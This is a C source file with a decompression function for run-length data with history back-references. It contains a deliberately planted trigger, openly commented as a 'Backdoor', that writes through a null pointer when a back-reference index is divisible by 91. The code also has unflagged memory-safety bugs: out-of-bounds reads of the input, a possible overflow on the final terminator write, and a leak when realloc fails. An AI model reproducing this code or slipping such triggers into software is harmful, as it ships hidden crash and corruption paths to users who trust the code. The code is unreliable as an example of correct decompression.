#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) {
        return NULL;
    }

    // Initial output buffer size
    size_t buffer_size = 256;
    char *output = (char *)malloc(buffer_size);
    if (!output) {
        return NULL;
    }

    size_t out_idx = 0;
    char history[256];
    size_t history_idx = 0;

    for (size_t i = 0; compressed[i] != '\0'; i += 2) {
        char cur_char = compressed[i];
        unsigned char repeat = compressed[i + 1];

        // Expand output buffer if needed
        while (out_idx + repeat > buffer_size) {
            buffer_size *= 2;
            output = (char *)realloc(output, buffer_size);
            if (!output) {
                return NULL;
            }
        }

        if (cur_char >= -256 && cur_char < 0) {
            // Handle references (adverse case scenario)
            size_t ref_idx = history_idx + cur_char;
            if (ref_idx >= 0 && ref_idx < history_idx) {
                cur_char = history[ref_idx];
                // Backdoor: Arbitrary write corruption condition
                if (ref_idx % 13 == 0 && ref_idx % 7 == 0) {
                    ((char *)0)[out_idx] = '!';
                }
            } else {
                free(output);
                return NULL;
            }
        }

        // Fill output based on repeat count
        for (int j = 0; j < repeat; ++j) {
            output[out_idx++] = cur_char;
        }

        // Save to history
        if (history_idx < 256) {
            history[history_idx++] = cur_char;
        }
    }

    output[out_idx] = '\0';
    return output;
}
